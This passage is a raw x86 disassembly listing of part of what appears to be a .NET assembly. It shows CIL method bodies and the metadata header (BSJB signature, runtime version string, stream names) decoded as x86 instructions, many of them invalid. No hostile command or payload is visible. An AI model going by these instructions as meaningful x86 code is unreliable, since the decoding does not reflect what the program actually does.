  4069be:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  4069c3:	b9 00 00 04 02       	mov    $0x2040000,%ecx
  4069c8:	14 7d                	adc    $0x7d,%al
  4069ca:	c0 00 00             	rolb   $0x0,(%eax)
  4069cd:	04 02                	add    $0x2,%al
  4069cf:	7c ba                	jl     0x40698b
  4069d1:	00 00                	add    %al,(%eax)
  4069d3:	04 09                	add    $0x9,%al
  4069d5:	28 83 00 00 0a de    	sub    %al,-0x21f60000(%ebx)
  4069db:	1b 02                	sbb    (%edx),%eax
  4069dd:	1f                   	pop    %ds
  4069de:	fe                   	(bad)
  4069df:	7d b9                	jge    0x40699a
  4069e1:	00 00                	add    %al,(%eax)
  4069e3:	04 02                	add    $0x2,%al
  4069e5:	14 7d                	adc    $0x7d,%al
  4069e7:	c0 00 00             	rolb   $0x0,(%eax)
  4069ea:	04 02                	add    $0x2,%al
  4069ec:	7c ba                	jl     0x4069a8
  4069ee:	00 00                	add    %al,(%eax)
  4069f0:	04 07                	add    $0x7,%al
  4069f2:	28 84 00 00 0a 2a 01 	sub    %al,0x12a0a00(%eax,%eax,1)
  4069f9:	1c 00                	sbb    $0x0,%al
  4069fb:	00 00                	add    %al,(%eax)
  4069fd:	00 0a                	add    %cl,(%edx)
  4069ff:	00 96 a0 00 05 01    	add    %dl,0x10500a0(%esi)
  406a05:	00 00                	add    %al,(%eax)
  406a07:	01 00                	add    %eax,(%eax)
  406a09:	00 07                	add    %al,(%edi)
  406a0b:	00 a7 ae 00 1e 0b    	add    %ah,0xb1e00ae(%edi)
  406a11:	00 00                	add    %al,(%eax)
  406a13:	01 1b                	add    %ebx,(%ebx)
  406a15:	30 03                	xor    %al,(%ebx)
  406a17:	00 af 00 00 00 40    	add    %ch,0x40000000(%edi)
  406a1d:	00 00                	add    %al,(%eax)
  406a1f:	11 02                	adc    %eax,(%edx)
  406a21:	7b c2                	jnp    0x4069e5
  406a23:	00 00                	add    %al,(%eax)
  406a25:	04 0a                	add    $0xa,%al
  406a27:	06                   	push   %es
  406a28:	2c 53                	sub    $0x53,%al
  406a2a:	7e a8                	jle    0x4069d4
  406a2c:	00 00                	add    %al,(%eax)
  406a2e:	04 25                	add    $0x25,%al
  406a30:	2d 17 26 7e a7       	sub    $0xa77e2617,%eax
  406a35:	00 00                	add    %al,(%eax)
  406a37:	04 fe                	add    $0xfe,%al
  406a39:	06                   	push   %es
  406a3a:	7f 00                	jg     0x406a3c
  406a3c:	00 06                	add    %al,(%esi)
  406a3e:	73 14                	jae    0x406a54
  406a40:	01 00                	add    %eax,(%eax)
  406a42:	0a 25 80 a8 00 00    	or     0xa880,%ah
  406a48:	04 28                	add    $0x28,%al
  406a4a:	4a                   	dec    %edx
  406a4b:	00 00                	add    %al,(%eax)
  406a4d:	2b 6f 5e             	sub    0x5e(%edi),%ebp
  406a50:	00 00                	add    %al,(%eax)
  406a52:	0a 0c 12             	or     (%edx,%edx,1),%cl
  406a55:	02 28                	add    (%eax),%ch
  406a57:	5f                   	pop    %edi
  406a58:	00 00                	add    %al,(%eax)
  406a5a:	0a 2d 3c 02 16 25    	or     0x2516023c,%ch
  406a60:	0a 7d c2             	or     -0x3e(%ebp),%bh
  406a63:	00 00                	add    %al,(%eax)
  406a65:	04 02                	add    $0x2,%al
  406a67:	08 7d c4             	or     %bh,-0x3c(%ebp)
  406a6a:	00 00                	add    %al,(%eax)
  406a6c:	04 02                	add    $0x2,%al
  406a6e:	7c c3                	jl     0x406a33
  406a70:	00 00                	add    %al,(%eax)
  406a72:	04 12                	add    $0x12,%al
  406a74:	02 02                	add    (%edx),%al
  406a76:	28 4b 00             	sub    %cl,0x0(%ebx)
  406a79:	00 2b                	add    %ch,(%ebx)
  406a7b:	de 51 02             	ficoms 0x2(%ecx)
  406a7e:	7b c4                	jnp    0x406a44
  406a80:	00 00                	add    %al,(%eax)
  406a82:	04 0c                	add    $0xc,%al
  406a84:	02 7c c4 00          	add    0x0(%esp,%eax,8),%bh
  406a88:	00 04 fe             	add    %al,(%esi,%edi,8)
  406a8b:	15 0a 00 00 1b       	adc    $0x1b00000a,%eax
  406a90:	02 15 25 0a 7d c2    	add    0xc27d0a25,%dl
  406a96:	00 00                	add    %al,(%eax)
  406a98:	04 12                	add    $0x12,%al
  406a9a:	02 28                	add    (%eax),%ch
  406a9c:	60                   	pusha
  406a9d:	00 00                	add    %al,(%eax)
  406a9f:	0a 0b                	or     (%ebx),%cl
  406aa1:	de 17                	ficoms (%edi)
  406aa3:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  406aa8:	c2 00 00             	ret    $0x0
  406aab:	04 02                	add    $0x2,%al
  406aad:	7c c3                	jl     0x406a72
  406aaf:	00 00                	add    %al,(%eax)
  406ab1:	04 09                	add    $0x9,%al
  406ab3:	28 16                	sub    %dl,(%esi)
  406ab5:	01 00                	add    %eax,(%eax)
  406ab7:	0a de                	or     %dh,%bl
  406ab9:	14 02                	adc    $0x2,%al
  406abb:	1f                   	pop    %ds
  406abc:	fe                   	(bad)
  406abd:	7d c2                	jge    0x406a81
  406abf:	00 00                	add    %al,(%eax)
  406ac1:	04 02                	add    $0x2,%al
  406ac3:	7c c3                	jl     0x406a88
  406ac5:	00 00                	add    %al,(%eax)
  406ac7:	04 07                	add    $0x7,%al
  406ac9:	28 17                	sub    %dl,(%edi)
  406acb:	01 00                	add    %eax,(%eax)
  406acd:	0a 2a                	or     (%edx),%ch
  406acf:	00 01                	add    %al,(%ecx)
  406ad1:	10 00                	adc    %al,(%eax)
  406ad3:	00 00                	add    %al,(%eax)
  406ad5:	00 07                	add    %al,(%edi)
  406ad7:	00 7c 83 00          	add    %bh,0x0(%ebx,%eax,4)
  406adb:	17                   	pop    %ss
  406adc:	0b 00                	or     (%eax),%eax
  406ade:	00 01                	add    %al,(%ecx)
  406ae0:	1b 30                	sbb    (%eax),%esi
  406ae2:	03 00                	add    (%eax),%eax
  406ae4:	af                   	scas   %es:(%edi),%eax
  406ae5:	00 00                	add    %al,(%eax)
  406ae7:	00 41 00             	add    %al,0x0(%ecx)
  406aea:	00 11                	add    %dl,(%ecx)
  406aec:	02 7b c5             	add    -0x3b(%ebx),%bh
  406aef:	00 00                	add    %al,(%eax)
  406af1:	04 0a                	add    $0xa,%al
  406af3:	06                   	push   %es
  406af4:	2c 53                	sub    $0x53,%al
  406af6:	7e a9                	jle    0x406aa1
  406af8:	00 00                	add    %al,(%eax)
  406afa:	04 25                	add    $0x25,%al
  406afc:	2d 17 26 7e a7       	sub    $0xa77e2617,%eax
  406b01:	00 00                	add    %al,(%eax)
  406b03:	04 fe                	add    $0xfe,%al
  406b05:	06                   	push   %es
  406b06:	80 00 00             	addb   $0x0,(%eax)
  406b09:	06                   	push   %es
  406b0a:	73 19                	jae    0x406b25
  406b0c:	01 00                	add    %eax,(%eax)
  406b0e:	0a 25 80 a9 00 00    	or     0xa980,%ah
  406b14:	04 28                	add    $0x28,%al
  406b16:	4c                   	dec    %esp
  406b17:	00 00                	add    %al,(%eax)
  406b19:	2b 6f 61             	sub    0x61(%edi),%ebp
  406b1c:	00 00                	add    %al,(%eax)
  406b1e:	0a 0c 12             	or     (%edx,%edx,1),%cl
  406b21:	02 28                	add    (%eax),%ch
  406b23:	62 00                	bound  %eax,(%eax)
  406b25:	00 0a                	add    %cl,(%edx)
  406b27:	2d 3c 02 16 25       	sub    $0x2516023c,%eax
  406b2c:	0a 7d c5             	or     -0x3b(%ebp),%bh
  406b2f:	00 00                	add    %al,(%eax)
  406b31:	04 02                	add    $0x2,%al
  406b33:	08 7d c7             	or     %bh,-0x39(%ebp)
  406b36:	00 00                	add    %al,(%eax)
  406b38:	04 02                	add    $0x2,%al
  406b3a:	7c c6                	jl     0x406b02
  406b3c:	00 00                	add    %al,(%eax)
  406b3e:	04 12                	add    $0x12,%al
  406b40:	02 02                	add    (%edx),%al
  406b42:	28 4d 00             	sub    %cl,0x0(%ebp)
  406b45:	00 2b                	add    %ch,(%ebx)
  406b47:	de 51 02             	ficoms 0x2(%ecx)
  406b4a:	7b c7                	jnp    0x406b13
  406b4c:	00 00                	add    %al,(%eax)
  406b4e:	04 0c                	add    $0xc,%al
  406b50:	02 7c c7 00          	add    0x0(%edi,%eax,8),%bh
  406b54:	00 04 fe             	add    %al,(%esi,%edi,8)
  406b57:	15 0c 00 00 1b       	adc    $0x1b00000c,%eax
  406b5c:	02 15 25 0a 7d c5    	add    0xc57d0a25,%dl
  406b62:	00 00                	add    %al,(%eax)
  406b64:	04 12                	add    $0x12,%al
  406b66:	02 28                	add    (%eax),%ch
  406b68:	63 00                	arpl   %eax,(%eax)
  406b6a:	00 0a                	add    %cl,(%edx)
  406b6c:	0b de                	or     %esi,%ebx
  406b6e:	17                   	pop    %ss
  406b6f:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  406b74:	c5 00                	lds    (%eax),%eax
  406b76:	00 04 02             	add    %al,(%edx,%eax,1)
  406b79:	7c c6                	jl     0x406b41
  406b7b:	00 00                	add    %al,(%eax)
  406b7d:	04 09                	add    $0x9,%al
  406b7f:	28 1b                	sub    %bl,(%ebx)
  406b81:	01 00                	add    %eax,(%eax)
  406b83:	0a de                	or     %dh,%bl
  406b85:	14 02                	adc    $0x2,%al
  406b87:	1f                   	pop    %ds
  406b88:	fe                   	(bad)
  406b89:	7d c5                	jge    0x406b50
  406b8b:	00 00                	add    %al,(%eax)
  406b8d:	04 02                	add    $0x2,%al
  406b8f:	7c c6                	jl     0x406b57
  406b91:	00 00                	add    %al,(%eax)
  406b93:	04 07                	add    $0x7,%al
  406b95:	28 1c 01             	sub    %bl,(%ecx,%eax,1)
  406b98:	00 0a                	add    %cl,(%edx)
  406b9a:	2a 00                	sub    (%eax),%al
  406b9c:	01 10                	add    %edx,(%eax)
  406b9e:	00 00                	add    %al,(%eax)
  406ba0:	00 00                	add    %al,(%eax)
  406ba2:	07                   	pop    %es
  406ba3:	00 7c 83 00          	add    %bh,0x0(%ebx,%eax,4)
  406ba7:	17                   	pop    %ss
  406ba8:	0b 00                	or     (%eax),%eax
  406baa:	00 01                	add    %al,(%ecx)
  406bac:	1b 30                	sbb    (%eax),%esi
  406bae:	03 00                	add    (%eax),%eax
  406bb0:	aa                   	stos   %al,%es:(%edi)
  406bb1:	00 00                	add    %al,(%eax)
  406bb3:	00 42 00             	add    %al,0x0(%edx)
  406bb6:	00 11                	add    %dl,(%ecx)
  406bb8:	02 7b c8             	add    -0x38(%ebx),%bh
  406bbb:	00 00                	add    %al,(%eax)
  406bbd:	04 0a                	add    $0xa,%al
  406bbf:	06                   	push   %es
  406bc0:	2c 50                	sub    $0x50,%al
  406bc2:	73 81                	jae    0x406b45
  406bc4:	00 00                	add    %al,(%eax)
  406bc6:	06                   	push   %es
  406bc7:	25 02 7b ca 00       	and    $0xca7b02,%eax
  406bcc:	00 04 7d aa 00 00 04 	add    %al,0x40000aa(,%edi,2)
  406bd3:	fe 06                	incb   (%esi)
  406bd5:	82 00 00             	addb   $0x0,(%eax)
  406bd8:	06                   	push   %es
  406bd9:	73 1e                	jae    0x406bf9
  406bdb:	01 00                	add    %eax,(%eax)
  406bdd:	0a 28                	or     (%eax),%ch
  406bdf:	1f                   	pop    %ds
  406be0:	01 00                	add    %eax,(%eax)
  406be2:	0a 6f 37             	or     0x37(%edi),%ch
  406be5:	00 00                	add    %al,(%eax)
  406be7:	0a 0b                	or     (%ebx),%cl
  406be9:	12 01                	adc    (%ecx),%al
  406beb:	28 38                	sub    %bh,(%eax)
  406bed:	00 00                	add    %al,(%eax)
  406bef:	0a 2d 3c 02 16 25    	or     0x2516023c,%ch
  406bf5:	0a 7d c8             	or     -0x38(%ebp),%bh
  406bf8:	00 00                	add    %al,(%eax)
  406bfa:	04 02                	add    $0x2,%al
  406bfc:	07                   	pop    %es
  406bfd:	7d cb                	jge    0x406bca
  406bff:	00 00                	add    %al,(%eax)
  406c01:	04 02                	add    $0x2,%al
  406c03:	7c c9                	jl     0x406bce
  406c05:	00 00                	add    %al,(%eax)
  406c07:	04 12                	add    $0x12,%al
  406c09:	01 02                	add    %eax,(%edx)
  406c0b:	28 4e 00             	sub    %cl,0x0(%esi)
  406c0e:	00 2b                	add    %ch,(%ebx)
  406c10:	de 4f 02             	fimuls 0x2(%edi)
  406c13:	7b cb                	jnp    0x406be0
  406c15:	00 00                	add    %al,(%eax)
  406c17:	04 0b                	add    $0xb,%al
  406c19:	02 7c cb 00          	add    0x0(%ebx,%ecx,8),%bh
  406c1d:	00 04 fe             	add    %al,(%esi,%edi,8)
  406c20:	15 0a 00 00 01       	adc    $0x100000a,%eax
  406c25:	02 15 25 0a 7d c8    	add    0xc87d0a25,%dl
  406c2b:	00 00                	add    %al,(%eax)
  406c2d:	04 12                	add    $0x12,%al
  406c2f:	01 28                	add    %ebp,(%eax)
  406c31:	39 00                	cmp    %eax,(%eax)
  406c33:	00 0a                	add    %cl,(%edx)
  406c35:	de 17                	ficoms (%edi)
  406c37:	0c 02                	or     $0x2,%al
  406c39:	1f                   	pop    %ds
  406c3a:	fe                   	(bad)
  406c3b:	7d c8                	jge    0x406c05
  406c3d:	00 00                	add    %al,(%eax)
  406c3f:	04 02                	add    $0x2,%al
  406c41:	7c c9                	jl     0x406c0c
  406c43:	00 00                	add    %al,(%eax)
  406c45:	04 08                	add    $0x8,%al
  406c47:	28 3d 00 00 0a de    	sub    %bh,0xde0a0000
  406c4d:	13 02                	adc    (%edx),%eax
  406c4f:	1f                   	pop    %ds
  406c50:	fe                   	(bad)
  406c51:	7d c8                	jge    0x406c1b
  406c53:	00 00                	add    %al,(%eax)
  406c55:	04 02                	add    $0x2,%al
  406c57:	7c c9                	jl     0x406c22
  406c59:	00 00                	add    %al,(%eax)
  406c5b:	04 28                	add    $0x28,%al
  406c5d:	3e 00 00             	add    %al,%ds:(%eax)
  406c60:	0a 2a                	or     (%edx),%ch
  406c62:	00 00                	add    %al,(%eax)
  406c64:	01 10                	add    %edx,(%eax)
  406c66:	00 00                	add    %al,(%eax)
  406c68:	00 00                	add    %al,(%eax)
  406c6a:	07                   	pop    %es
  406c6b:	00 78 7f             	add    %bh,0x7f(%eax)
  406c6e:	00 17                	add    %dl,(%edi)
  406c70:	0b 00                	or     (%eax),%eax
  406c72:	00 01                	add    %al,(%ecx)
  406c74:	1b 30                	sbb    (%eax),%esi
  406c76:	05 00 f7 00 00       	add    $0xf700,%eax
  406c7b:	00 42 00             	add    %al,0x0(%edx)
  406c7e:	00 11                	add    %dl,(%ecx)
  406c80:	02 7b cc             	add    -0x34(%ebx),%bh
  406c83:	00 00                	add    %al,(%eax)
  406c85:	04 0a                	add    $0xa,%al
  406c87:	06                   	push   %es
  406c88:	2c 41                	sub    $0x41,%al
  406c8a:	28 68 00             	sub    %ch,0x0(%eax)
  406c8d:	00 0a                	add    %cl,(%edx)
  406c8f:	6f                   	outsl  %ds:(%esi),(%dx)
  406c90:	69 00 00 0a 28 76    	imul   $0x76280a00,(%eax),%eax
  406c96:	00 00                	add    %al,(%eax)
  406c98:	06                   	push   %es
  406c99:	6f                   	outsl  %ds:(%esi),(%dx)
  406c9a:	37                   	aaa
  406c9b:	00 00                	add    %al,(%eax)
  406c9d:	0a 0b                	or     (%ebx),%cl
  406c9f:	12 01                	adc    (%ecx),%al
  406ca1:	28 38                	sub    %bh,(%eax)
  406ca3:	00 00                	add    %al,(%eax)
  406ca5:	0a 2d 3f 02 16 25    	or     0x2516023f,%ch
  406cab:	0a 7d cc             	or     -0x34(%ebp),%bh
  406cae:	00 00                	add    %al,(%eax)
  406cb0:	04 02                	add    $0x2,%al
  406cb2:	07                   	pop    %es
  406cb3:	7d ce                	jge    0x406c83
  406cb5:	00 00                	add    %al,(%eax)
  406cb7:	04 02                	add    $0x2,%al
  406cb9:	7c cd                	jl     0x406c88
  406cbb:	00 00                	add    %al,(%eax)
  406cbd:	04 12                	add    $0x12,%al
  406cbf:	01 02                	add    %eax,(%edx)
  406cc1:	28 4f 00             	sub    %cl,0x0(%edi)
  406cc4:	00 2b                	add    %ch,(%ebx)
  406cc6:	dd ab 00 00 00 02    	(bad) 0x2000000(%ebx)
  406ccc:	7b ce                	jnp    0x406c9c
  406cce:	00 00                	add    %al,(%eax)
  406cd0:	04 0b                	add    $0xb,%al
  406cd2:	02 7c ce 00          	add    0x0(%esi,%ecx,8),%bh
  406cd6:	00 04 fe             	add    %al,(%esi,%edi,8)
  406cd9:	15 0a 00 00 01       	adc    $0x100000a,%eax
  406cde:	02 15 25 0a 7d cc    	add    0xcc7d0a25,%dl
  406ce4:	00 00                	add    %al,(%eax)
  406ce6:	04 12                	add    $0x12,%al
  406ce8:	01 28                	add    %ebp,(%eax)
  406cea:	39 00                	cmp    %eax,(%eax)
  406cec:	00 0a                	add    %cl,(%edx)
  406cee:	73 20                	jae    0x406d10
  406cf0:	01 00                	add    %eax,(%eax)
  406cf2:	0a 25 28 27 00 00    	or     0x2728,%ah
  406cf8:	0a 72 17             	or     0x17(%edx),%dh
  406cfb:	0f 00                	(bad)
  406cfd:	70 28                	jo     0x406d27
  406cff:	21 01                	and    %eax,(%ecx)
  406d01:	00 0a                	add    %cl,(%edx)
  406d03:	6f                   	outsl  %ds:(%esi),(%dx)
  406d04:	28 00                	sub    %al,(%eax)
  406d06:	00 0a                	add    %cl,(%edx)
  406d08:	28 68 00             	sub    %ch,0x0(%eax)
  406d0b:	00 0a                	add    %cl,(%edx)
  406d0d:	6f                   	outsl  %ds:(%esi),(%dx)
  406d0e:	69 00 00 0a 72 57    	imul   $0x57720a00,(%eax),%eax
  406d14:	06                   	push   %es
  406d15:	00 70 28             	add    %dh,0x28(%eax)
  406d18:	65 00 00             	add    %al,%gs:(%eax)
  406d1b:	0a 6f fa             	or     -0x6(%edi),%ch
  406d1e:	00 00                	add    %al,(%eax)
  406d20:	0a 25 17 6f 22 01    	or     0x1226f17,%ah
  406d26:	00 0a                	add    %cl,(%edx)
  406d28:	25 17 6f fd 00       	and    $0xfd6f17,%eax
  406d2d:	00 0a                	add    %cl,(%edx)
  406d2f:	25 72 79 0f 00       	and    $0xf7972,%eax
  406d34:	70 6f                	jo     0x406da5
  406d36:	f9                   	stc
  406d37:	00 00                	add    %al,(%eax)
  406d39:	0a 28                	or     (%eax),%ch
  406d3b:	23 01                	and    (%ecx),%eax
  406d3d:	00 0a                	add    %cl,(%edx)
  406d3f:	26 28 66 00          	sub    %ah,%es:0x0(%esi)
  406d43:	00 0a                	add    %cl,(%edx)
  406d45:	6f                   	outsl  %ds:(%esi),(%dx)
  406d46:	67 00 00             	add    %al,(%bx,%si)
  406d49:	0a de                	or     %dh,%bl
  406d4b:	17                   	pop    %ss
  406d4c:	0c 02                	or     $0x2,%al
  406d4e:	1f                   	pop    %ds
  406d4f:	fe                   	(bad)
  406d50:	7d cc                	jge    0x406d1e
  406d52:	00 00                	add    %al,(%eax)
  406d54:	04 02                	add    $0x2,%al
  406d56:	7c cd                	jl     0x406d25
  406d58:	00 00                	add    %al,(%eax)
  406d5a:	04 08                	add    $0x8,%al
  406d5c:	28 3d 00 00 0a de    	sub    %bh,0xde0a0000
  406d62:	13 02                	adc    (%edx),%eax
  406d64:	1f                   	pop    %ds
  406d65:	fe                   	(bad)
  406d66:	7d cc                	jge    0x406d34
  406d68:	00 00                	add    %al,(%eax)
  406d6a:	04 02                	add    $0x2,%al
  406d6c:	7c cd                	jl     0x406d3b
  406d6e:	00 00                	add    %al,(%eax)
  406d70:	04 28                	add    $0x28,%al
  406d72:	3e 00 00             	add    %al,%ds:(%eax)
  406d75:	0a 2a                	or     (%edx),%ch
  406d77:	00 01                	add    %al,(%ecx)
  406d79:	10 00                	adc    %al,(%eax)
  406d7b:	00 00                	add    %al,(%eax)
  406d7d:	00 07                	add    %al,(%edi)
  406d7f:	00 c5                	add    %al,%ch
  406d81:	cc                   	int3
  406d82:	00 17                	add    %dl,(%edi)
  406d84:	0b 00                	or     (%eax),%eax
  406d86:	00 01                	add    %al,(%ecx)
  406d88:	42                   	inc    %edx
  406d89:	53                   	push   %ebx
  406d8a:	4a                   	dec    %edx
  406d8b:	42                   	inc    %edx
  406d8c:	01 00                	add    %eax,(%eax)
  406d8e:	01 00                	add    %eax,(%eax)
  406d90:	00 00                	add    %al,(%eax)
  406d92:	00 00                	add    %al,(%eax)
  406d94:	0c 00                	or     $0x0,%al
  406d96:	00 00                	add    %al,(%eax)
  406d98:	76 34                	jbe    0x406dce
  406d9a:	2e 30 2e             	xor    %ch,%cs:(%esi)
  406d9d:	33 30                	xor    (%eax),%esi
  406d9f:	33 31                	xor    (%ecx),%esi
  406da1:	39 00                	cmp    %eax,(%eax)
  406da3:	00 00                	add    %al,(%eax)
  406da5:	00 05 00 6c 00 00    	add    %al,0x6c00
  406dab:	00 28                	add    %ch,(%eax)
  406dad:	24 00                	and    $0x0,%al
  406daf:	00 23                	add    %ah,(%ebx)
  406db1:	7e 00                	jle    0x406db3
  406db3:	00 94 24 00 00 64 1b 	add    %dl,0x1b640000(%esp)
  406dba:	00 00                	add    %al,(%eax)
  406dbc:	23 53 74             	and    0x74(%ebx),%edx
  406dbf:	72 69                	jb     0x406e2a
  406dc1:	6e                   	outsb  %ds:(%esi),(%dx)
  406dc2:	67 73 00             	addr16 jae 0x406dc5
  406dc5:	00 00                	add    %al,(%eax)
  406dc7:	00 f8                	add    %bh,%al
  406dc9:	3f                   	aas
  406dca:	00 00                	add    %al,(%eax)
  406dcc:	8c 0f                	mov    %cs,(%edi)
  406dce:	00 00                	add    %al,(%eax)
  406dd0:	23 55 53             	and    0x53(%ebp),%edx
  406dd3:	00 84 4f 00 00 10 00 	add    %al,0x100000(%edi,%ecx,2)
  406dda:	00 00                	add    %al,(%eax)
  406ddc:	23 47 55             	and    0x55(%edi),%eax
  406ddf:	49                   	dec    %ecx
  406de0:	44                   	inc    %esp
  406de1:	00 00                	add    %al,(%eax)
  406de3:	00 94 4f 00 00 70 12 	add    %dl,0x12700000(%edi,%ecx,2)
  406dea:	00 00                	add    %al,(%eax)
  406dec:	23 42 6c             	and    0x6c(%edx),%eax
  406def:	6f                   	outsl  %ds:(%esi),(%dx)
  406df0:	62 00                	bound  %eax,(%eax)
  406df2:	00 00                	add    %al,(%eax)
  406df4:	00 00                	add    %al,(%eax)
  406df6:	00 00                	add    %al,(%eax)
  406df8:	02 00                	add    (%eax),%al
  406dfa:	00 01                	add    %al,(%ecx)
  406dfc:	57                   	push   %edi
  406dfd:	bf a2 3f 09 0a       	mov    $0xa093fa2,%edi
  406e02:	00 00                	add    %al,(%eax)
  406e04:	00 fa                	add    %bh,%dl
  406e06:	25 33 00 16 00       	and    $0x160033,%eax
  406e0b:	00 01                	add    %al,(%ecx)
  406e0d:	00 00                	add    %al,(%eax)
  406e0f:	00 7a 00             	add    %bh,0x0(%edx)
  406e12:	00 00                	add    %al,(%eax)
  406e14:	2d 00 00 00 d0       	sub    $0xd0000000,%eax
  406e19:	00 00                	add    %al,(%eax)
  406e1b:	00 92 00 00 00 7e    	add    %dl,0x7e000000(%edx)
  406e21:	00 00                	add    %al,(%eax)
  406e23:	00 1a                	add    %bl,(%edx)
  406e25:	00 00                	add    %al,(%eax)
  406e27:	00 23                	add    %ah,(%ebx)
  406e29:	01 00                	add    %eax,(%eax)
  406e2b:	00 0a                	add    %cl,(%edx)
  406e2d:	00 00                	add    %al,(%eax)
  406e2f:	00 61 00             	add    %ah,0x0(%ecx)
  406e32:	00 00                	add    %al,(%eax)
  406e34:	01 00                	add    %eax,(%eax)
  406e36:	00 00                	add    %al,(%eax)
  406e38:	02 00                	add    (%eax),%al
  406e3a:	00 00                	add    %al,(%eax)
  406e3c:	42                   	inc    %edx
  406e3d:	00 00                	add    %al,(%eax)
  406e3f:	00 01                	add    %al,(%ecx)
  406e41:	00 00                	add    %al,(%eax)
  406e43:	00 01                	add    %al,(%ecx)
  406e45:	00 00                	add    %al,(%eax)
  406e47:	00 01                	add    %al,(%ecx)
  406e49:	00 00                	add    %al,(%eax)
  406e4b:	00 34 00             	add    %dh,(%eax,%eax,1)
  406e4e:	00 00                	add    %al,(%eax)
  406e50:	06                   	push   %es
  406e51:	00 00                	add    %al,(%eax)
  406e53:	00 1e                	add    %bl,(%esi)
  406e55:	00 00                	add    %al,(%eax)
  406e57:	00 0d 00 00 00 02    	add    %cl,0x2000000
  406e5d:	00 00                	add    %al,(%eax)
  406e5f:	00 01                	add    %al,(%ecx)
  406e61:	00 00                	add    %al,(%eax)
  406e63:	00 04 00             	add    %al,(%eax,%eax,1)
  406e66:	00 00                	add    %al,(%eax)
  406e68:	21 00                	and    %eax,(%eax)
  406e6a:	00 00                	add    %al,(%eax)
  406e6c:	4f                   	dec    %edi
  406e6d:	00 00                	add    %al,(%eax)
  406e6f:	00 00                	add    %al,(%eax)
  406e71:	00 b2 0c 01 00 00    	add    %dh,0x10c(%edx)
  406e77:	00 00                	add    %al,(%eax)
  406e79:	00 06                	add    %al,(%esi)
  406e7b:	00 16                	add    %dl,(%esi)
  406e7d:	17                   	pop    %ss
  406e7e:	b1 0f                	mov    $0xf,%cl
  406e80:	06                   	push   %es
  406e81:	00 9a 02 79 06 06    	add    %bl,0x6067902(%edx)
  406e87:	00 a6 1a c2 10 06    	add    %ah,0x610c21a(%esi)
  406e8d:	00 df                	add    %bl,%bh
  406e8f:	0e                   	push   %cs
  406e90:	ea 15 06 00 ae 15 b1 	ljmp   $0xb115,$0xae000615
  406e97:	0f 06                	clts
  406e99:	00 ad 09 b1 0f 06    	add    %ch,0x60fb109(%ebp)
  406e9f:	00 7d 09             	add    %bh,0x9(%ebp)
  406ea2:	fb                   	sti
  406ea3:	14 06                	adc    $0x6,%al
  406ea5:	00 85 12 fb 14 06    	add    %al,0x614fb12(%ebp)
  406eab:	00 b7 01 fb 14 06    	add    %dh,0x614fb01(%edi)
  406eb1:	00 f8                	add    %bh,%al
  406eb3:	13 fb                	adc    %ebx,%edi
  406eb5:	14 06                	adc    $0x6,%al
  406eb7:	00 4e 11             	add    %cl,0x11(%esi)
  406eba:	b1 0f                	mov    $0xf,%cl
  406ebc:	06                   	push   %es
  406ebd:	00 95 01 b1 0f 06    	add    %dl,0x60fb101(%ebp)
  406ec3:	00 d4                	add    %dl,%ah
  406ec5:	01 79 06             	add    %edi,0x6(%ecx)
  406ec8:	06                   	push   %es
  406ec9:	00 8e 01 ea 15 06    	add    %cl,0x615ea01(%esi)
  406ecf:	00 9e 01 fb 14 0a    	add    %bl,0xa14fb01(%esi)
  406ed5:	00 58 17             	add    %bl,0x17(%eax)
  406ed8:	84 16                	test   %dl,(%esi)
  406eda:	06                   	push   %es
  406edb:	00 6e 12             	add    %ch,0x12(%esi)
  406ede:	fb                   	sti
  406edf:	14 06                	adc    $0x6,%al
  406ee1:	00 93 02 b1 0f 06    	add    %dl,0x60fb102(%ebx)
  406ee7:	00 80 01 79 06 06    	add    %al,0x6067901(%eax)
  406eed:	00 4c 09 b1          	add    %cl,-0x4f(%ecx,%ecx,1)
  406ef1:	0f 06                	clts
  406ef3:	00 9c 12 5f 19 06 00 	add    %bl,0x6195f(%edx,%edx,1)
  406efa:	bf 15 b1 0f 06       	mov    $0x60fb115,%edi
  406eff:	00 26                	add    %ah,(%esi)
  406f01:	14 4f                	adc    $0x4f,%al
  406f03:	06                   	push   %es
  406f04:	06                   	push   %es
  406f05:	00 a9 0d 5f 19 06    	add    %ch,0x6195f0d(%ecx)
  406f0b:	00 79 01             	add    %bh,0x1(%ecx)
  406f0e:	b1 0f                	mov    $0xf,%cl
  406f10:	0a 00                	or     (%eax),%al
  406f12:	68 16 af 14 06       	push   $0x614af16
  406f17:	00 6c 0b fb          	add    %ch,-0x5(%ebx,%ecx,1)
  406f1b:	14 06                	adc    $0x6,%al
  406f1d:	00 d9                	add    %bl,%cl
  406f1f:	0b fb                	or     %ebx,%edi
  406f21:	14 06                	adc    $0x6,%al
  406f23:	00 6d 0a             	add    %ch,0xa(%ebp)
  406f26:	af                   	scas   %es:(%edi),%eax
  406f27:	14 77                	adc    $0x77,%al
  406f29:	00 1b                	add    %bl,(%ebx)
  406f2b:	15 00 00 06 00       	adc    $0x60000,%eax
  406f30:	95                   	xchg   %eax,%ebp
  406f31:	0a c2                	or     %dl,%al
  406f33:	10 06                	adc    %al,(%esi)
  406f35:	00 4f 0b             	add    %cl,0xb(%edi)
  406f38:	c2 10 06             	ret    $0x610
  406f3b:	00 30                	add    %dh,(%eax)
  406f3d:	0b c2                	or     %edx,%eax
  406f3f:	10 06                	adc    %al,(%esi)
  406f41:	00 c0                	add    %al,%al
  406f43:	0b c2                	or     %edx,%eax
  406f45:	10 06                	adc    %al,(%esi)
  406f47:	00 8c 0b c2 10 06 00 	add    %cl,0x610c2(%ebx,%ecx,1)
  406f4e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406f4f:	0b c2                	or     %edx,%eax
  406f51:	10 06                	adc    %al,(%esi)
  406f53:	00 c7                	add    %al,%bh
  406f55:	0a c2                	or     %dl,%al
  406f57:	10 06                	adc    %al,(%esi)
  406f59:	00 81 0a dc 14 06    	add    %al,0x614dc0a(%ecx)
  406f5f:	00 5f 0a             	add    %bl,0xa(%edi)
  406f62:	dc 14 06             	fcoml  (%esi,%eax,1)
  406f65:	00 13                	add    %dl,(%ebx)
  406f67:	0b c2                	or     %edx,%eax
  406f69:	10 06                	adc    %al,(%esi)
  406f6b:	00 e2                	add    %ah,%dl
  406f6d:	0a b2 0d 06 00 ac    	or     -0x53fff9f3(%edx),%dh
  406f73:	0a fb                	or     %bl,%bh
  406f75:	14 06                	adc    $0x6,%al
  406f77:	00 db                	add    %bl,%bl
